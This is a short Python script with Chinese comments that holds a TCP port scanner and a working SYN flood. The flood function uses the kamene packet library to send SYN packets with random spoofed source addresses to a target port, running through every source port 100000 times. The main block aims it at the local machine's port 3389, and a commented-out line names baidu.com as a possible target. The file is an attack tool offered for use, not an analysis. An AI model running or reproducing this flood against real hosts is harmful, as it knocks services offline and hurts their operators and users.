#!/usr/bin/python
# -*- coding: utf-8 -*-
import progressbar
import sys
import socket
from kamene.all import *
import random

def scanPort(host,start_port,end_port):
    target_ip = socket.gethostbyname(host)
    opened_ports = []

    p = progressbar.ProgressBar(maxval=end_port-start_port+1,widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()]);
    p.start();
    for port in range(start_port, end_port+1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.001)
        result = sock.connect_ex((target_ip, port))
        # print("{} {}".format(port,result==0))
        if result == 0:
            opened_ports.append(port)
        p.update(port-start_port)

    print("Opened ports:")

    for i in opened_ports:
        print(i)

def synFlood(tgt,dPort):
    #  先任意伪造4个ip地址
    srcList = ['11.1.1.2','22.1.1.102','33.1.1.2',
               '125.130.5.199']
    #  选择任意一个端口号
    for i in range(100000):
        for sPort in range(1024, 65535):
            # index = random.randrange(4)
            src="{}.{}.{}.{}".format(random.randrange(200),random.randrange(200),random.randrange(200),random.randrange(200))
            print(src)
            #  类似上面那个代码构造IP/TCP包，然后send
            ipLayer = IP(src=src, dst=tgt)
            tcpLayer = TCP(sport=sPort, dport=dPort,flags='S')
            packet = ipLayer/tcpLayer
            send(packet)


if __name__=="__main__":
    # argv=sys.argv;
    # argv=['','127.0.0.1',3300,3400];
    # scanPort(argv[1],int(argv[2]),int(argv[3]));
    #
    # synFlood(argv[1],argv[3])
    # domain = "www.baidu.com"  # 定义你想攻击的域名，不建议是百度哈，别怪我没提醒
    # tgt = socket.gethostbyname(domain)  # 利用socket的方法获取域名的ip地址，即dns解析
    hostname = socket.gethostname()
    # print(socket.gethostbyname(hostname))
    tgt=socket.gethostbyname(hostname)
    # print(type(tgt))
    # print(tgt)  # 可以打印出来看一下
    dPort = 3389  # 网络传输常用端口号
    synFlood(tgt, dPort)  # 调用syn洪流函数，然后发送syn包